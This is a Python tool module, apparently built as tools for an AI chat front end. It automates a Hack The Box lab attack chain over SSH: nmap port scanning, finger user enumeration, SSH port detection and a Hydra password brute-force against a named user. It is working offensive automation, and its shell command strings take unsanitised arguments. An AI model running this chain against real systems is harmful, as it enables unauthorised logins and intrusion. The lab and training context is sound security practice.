"""
title: SSH Command Executor
author: Ella Duffy
version: 1.2.2
description: Executes commands on my remote HTB Parrot OS VM and returns the output, with logging.
"""

import paramiko
import os
import logging
import time
import re
from typing import Tuple, Optional, Dict, List
from langchain_community.chat_message_histories import ChatMessageHistory
import ast
from contextlib import contextmanager

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        #logging.FileHandler('/app/logs/ssh_executor.log'),  # Save logs to file - for OpenWebUI
        logging.FileHandler('logs/ssh_executor.log'),
        logging.StreamHandler()  # Also print to console
    ]
)
logger = logging.getLogger(__name__)

logger.info("Loading SSH Command Executor") #using logging module over print statements for flexibility and control

class Tools:
    def __init__(self, memory: ChatMessageHistory = None):
        self.memory = memory if memory is not None else ChatMessageHistory() #Initialize or use provided memory

    @contextmanager
    def ssh_client(self, host: str, username: str, timeout: int = 300):
        """
        Context manager for SSH client connection with timeout and optional key.
        
        Args:
            host (str): The IP address of the VM to SSH into.
            username (str): The SSH username for the host VM.
            timeout (int): Maximum connection time in seconds (default: 300).
        """
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(host, username=username, key_filename="/Users/elladuffy/.ssh/id_rsa", passphrase=os.environ.get("SSH_PASSPHRASE")) #key_filename = "/app/tools/id_rsa"  -- for Open WebUI
            yield client
        except Exception as e:
            logger.error(f"SSH connection error: {str(e)}")
            raise
        finally:
            client.close()
    
    def ssh_command_executor(self, host: str, username: str, command: str, timeout: int = 300) -> str:
        """
        Execute a command on my remote HTB Parrot OS VM using the SSH agent for authentication.
    
        Args:
            host (str): The IP address or hostname of the HTB VM (e.g., '192.168.1.100').
            username (str): The SSH username (e.g., 'parrot' or 'user').
            command (str): The command to execute (e.g., 'whoami').
            timeout (int): Maximum execution time in seconds (default: 300).
    
        Returns:
            str: The output of the command (stdout + stderr).

        Raises:
            ValueError: If the SSH_PASSPHRASE environment variable is not set.
        """
        logger.info(f"Connecting to {host} as {username}")
        passphrase = os.environ.get("SSH_PASSPHRASE")
        if not passphrase:
            logger.error("SSH_PASSPHRASE environment variable not set")
            raise ValueError("SSH_PASSPHRASE environment variable not set")
        try:
            start_time = time.time()
            with self.ssh_client(host, username, timeout) as client:
                full_command = f"PATH=$PATH:/sbin:/usr/sbin {command}"
                logger.info(f"Executing command: {full_command}")
                channel = client.get_transport().open_session()
                channel.settimeout(timeout)
                channel.exec_command(full_command)
                output = []
                while not channel.exit_status_ready():
                    if channel.recv_ready():
                        output.append(channel.recv(1024).decode())
                    time.sleep(0.1)  # Brief pause to avoid busy-waiting
                    if time.time() - start_time > timeout:
                        logger.warning(f"Command timed out after {timeout} seconds")
                        channel.close()
                        raise TimeoutError(f"Command timed out after {timeout} seconds")
                if channel.recv_stderr_ready():
                    error = channel.recv_stderr(1024).decode()
                    if error:
                        logger.warning(f"Command stderr: {error.strip()}")
                        output.append(error)
                result = "".join(output).strip()
                logger.info(f"Command output:\n{result}")
                return result
        except paramiko.SSHException as e:
            logger.error(f"SSH execution failed: {str(e)}")
            raise
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            raise
    
    def scan_ports(self, host: str, username: str, target: str) -> Dict[str, str]:
        """
        Scan open ports on the remote host using nmap via SSH.

        Args:
            host (str): The IP address of the VM to SSH into (e.g., '10.0.0.215').
            username (str): The SSH username.
            target (str): The target IP to scan (e.g., '10.10.10.76').

        Returns:
            dict: Dictionary of port:service pairs.
        """
        logger.info(f"Scanning open ports on {target}")
        command = f"nmap -p1-1000,22022 {target} --max-retries 2 -Pn --max-rate 50 --open"
        try:
            output = self.ssh_command_executor(host, username, command)
            ports = {}
            for line in output.splitlines():
                match = re.search(r"(\d+)/tcp\s+open\s+(\w+)", line)
                if match:
                    port, service = match.groups()
                    ports[port] = service
            logger.info(f"Scanned ports: {ports}")
            #Store these results in memory
            self.memory.add_message({"role": "assistant", "content": f"Scanned ports on {target}: {ports}"})
            return ports
        except Exception as e:
            logger.error(f"Port scan failed: {str(e)}")
            self.memory.add_message({"role": "assistant", "content": f"Port scan failed on {target}: {str(e)}"})
            return {}
    
    def enumerate_users(self, host: str, username: str, target: str, wordlist="/usr/share/seclists/Usernames/Names/names.txt") -> List[str]:
        """
        Enumerate users on the remote host using finger via SSH.

        Args:
            host (str): The IP address of the VM to SSH into.
            username (str): The SSH username.
            target (str): The target IP.
            wordlist (str): Path to username wordlist on target.

        Returns:
            list: List of enumerated users.
        """
        logger.info(f"Enumerating users on {target} with wordlist {wordlist}")
        command = f"finger-user-enum -U {wordlist} -t {target}"
        try:
            output = self.ssh_command_executor(host, username, command)
            users = set()  # Use set to avoid duplicates
            system_users = {"access", "admin", "bin", "ikeuser", "lp", "smmsp", "sys", "daemon", "nobody", "root", "adm", "dladm", "netadm", "netcfg", "dhcpserv"}

            for line in output.splitlines():
                if "@" in line and ":" in line and "ssh" in line.lower():
                    user_part = line.split(":")[1].strip()
                    if user_part:
                        parts = user_part.split()
                        if parts and not parts[0].startswith("<"):
                            user = parts[0].lower()
                            if (user.isalpha() and 
                                user not in system_users and 
                                user not in ["login", "name", "tty"]):
                                users.add(user)
            users_list = sorted(list(users))
            logger.info(f"Refined SSH users: {users_list}")
            self.memory.add_message({"role": "assistant", "content": f"Enumerated users on {target}: {users_list}"})
            return users_list
        except Exception as e:
            logger.error(f"User enumeration failed: {str(e)}")
            self.memory.add_message({"role": "assistant", "content": f"User enumeration failed on {target}: {str(e)}"})
            return []
        
    
    def detect_ssh_port(self, host: str, username: str, target: str) -> Optional[int]:
        """
        Detect the port running SSH on the target host using nmap, so we can adequately brute force the service. 
        
        Args:
            host (str): The IP address of the VM to SSH into.
            username (str): The SSH username.
            target (str): The target IP.
        
        Returns:
            int: Port number where SSH is detected, or None if not found
        """
        logger.info(f"Detecting SSH port on {target}")
        try:
            #Check LLM memory first
            memory_content = "\n".join(msg["content"] for msg in self.memory.messages if "content" in msg)
            logger.info(f"Checking memory... \n: {memory_content}")

            #Look for previously detected SSH port
            match = re.search(r"SSH detected on port: (\d+)", memory_content)
            if match:
                port = int(match.group(1))
                logger.info(f"SSH port {port} retrieved from LLM memory.")
                self.memory.add_message({"role": "assistant", "content": f"SSH detected on port: {port} (from memory)"})
                return port
            
            # Parse scan_ports memory to find potential SSH ports
            scan_match = re.search(r"Scanned ports on " + re.escape(target) + r":\s*({[^}]*})", memory_content)
            if scan_match:
                ports_str = scan_match.group(1).strip()
                try:
                    ports = ast.literal_eval(ports_str)
                    for port, service in ports.items():
                        if service.lower() in ["ssh", "openssh"]: #Trust what was found by scan_port tool
                            logger.info(f"SSH port {port} found in scan_ports memory with service {service}.")
                            self.memory.add_message({"role": "assistant", "content": f"SSH detected on port: {port}"})
                            return int(port)
                        elif service.lower() == "unknown":
                            logger.info(f"Probing unknown service on memory port {port} for SSH.")
                            probe_cmd = f"nmap -p {port} -sC -sV {target}"
                            output = self.ssh_command_executor(host, username, probe_cmd)
                            if "ssh" in output.lower():
                                detected_port = int(port)
                                logger.info(f"SSH confirmed on probed port: {detected_port}")
                                self.memory.add_message({"role": "assistant", "content": f"SSH detected on port: {detected_port}"})
                                return detected_port
                except (ValueError, SyntaxError) as e:
                    logger.error(f"Failed to parse ports string '{ports_str}': {str(e)}")
            
            # No memory run fast SSH-specific scan on typical ports
            logger.info("No memory data, running fast nmap scan.")
            fast_scan_cmd = f"nmap -p 22,22022,2222,22222 -sC -sV {target}"
            output = self.ssh_command_executor(host, username, fast_scan_cmd)
            ssh_port = None
            for line in output.splitlines():
                match = re.search(r"(\d+)/tcp\s+open\s+ssh", line)
                if match:
                    ssh_port = int(match.group(1))
                    logger.info(f"SSH detected on port: {ssh_port}")
                    break
            if ssh_port:
                self.memory.add_message({"role": "assistant", "content": f"SSH detected on port: {ssh_port}"})
                return ssh_port
            else:
                self.memory.add_message({"role": "assistant", "content": "No SSH port detected."})
                logger.warning("No SSH port detected.")
                return None
        
        except Exception as e:
            logger.error(f"Error detecting SSH port: {str(e)}")
            self.memory.add_message({"role": "assistant", "content": f"Error detecting SSH port on {target}: {str(e)}"})
            return None
        
    def run_hydra_attack(self, host: str, username: str, target: str, target_username: str, password_file: str, port: int = 22, protocol: str = "ssh") -> Dict[str, str]:
        """
        Run a Hydra password attack on the target using the specified username and password list.
        
        Args:
            host (str): The IP address of the VM to SSH into (e.g., '10.0.0.215').
            username (str): The SSH username for the host VM (e.g., 'user').
            target (str): The target IP address to attack (e.g., '10.10.10.76').
            target_username (str): The username to test on the target (e.g., 'sunny').
            password_file (str): Path to the password list (e.g., '/usr/share/seclists/Passwords/probable-v2-top1575.txt').
            port (int): The port to target (e.g., 22022).
            protocol (str): The protocol to use (e.g., 'ssh', default is 'ssh').

        Returns:
            dict: Dictionary of username:password pairs that succeed.
        """
        logger.info(f"Starting Hydra attack on {target} for {target_username} with port {port}")
        command = f"hydra -l {target_username} -P {password_file} {protocol}://{target} -s {port}"
        try:
            # Execute Hydra command via SSH on the host VM
            output = self.ssh_command_executor(host, username, command)
            # Parse output for successful login with improved logic
            credentials = {}
            for line in output.splitlines():
                if "[ssh]" in line and "login:" in line and "password:" in line:
                    # Extract username and password from the line
                    login_index = line.index("login:") + len("login:")
                    password_index = line.index("password:")
                    cred_user = line[login_index:password_index].strip()
                    cred_pass = line[password_index + len("password:"):].strip()
                    if cred_user and cred_pass:
                        credentials[cred_user] = cred_pass
                        break  # Stop after first success (adjust if multiple logins possible)
            if credentials:
                self.memory.add_message({"role": "assistant", "content": f"Hydra success: {credentials} on {target}"})
                return credentials
            else:
                self.memory.add_message({"role": "assistant", "content": f"No successful logins on {target}"})
                logger.warning("No successful logins detected.")
                return {}
        except Exception as e:
            logger.error(f"Hydra attack failed: {str(e)}")
            self.memory.add_message({"role": "assistant", "content": f"Hydra failed on {target}: {str(e)}"})
        return {}
        

    def main(self, host: str, username: str, target: str):
        logger.info(f"Starting attack chain on {target} via {host}")
        ports = self.scan_ports(host, username, target)
        #if ports:
        #    logger.info(f"Found ports: {ports}")
        #    if "79" in ports:
        #        users = self.enumerate_users(host, username, target)
        #        logger.info(f"Found users: {users}")
        #    else:
        #        logger.warning("No exploitable ports with finger service (79) found")
        #else:
        #    logger.warning("Port scan failed or no ports found")
        
        #Testing the detect ssh port function
        logger.info(f"Testing SSH port detection on {target} via {host}")
        ssh_port = self.detect_ssh_port(host, username, target)
        if ssh_port:
            logger.info(f"Found SSH: {ssh_port}")
        else:
            logger.warning("No SSH port detected")

        #Testing Hydra - hard code inputs
        hydra = self.run_hydra_attack(host, username, target, 'sunny', '/usr/share/seclists/Passwords/probable-v2-top1575.txt', ssh_port)
        logger.info(f"Hydra findings: {hydra}")

if __name__ == "__main__":
    tools = Tools()
    host = "10.0.0.215"  # IP of Local VM for testing
    username = "user"  # Username for VM
    target = "10.10.10.76"  # HTB Sunday target
    tools.main(host, username, target)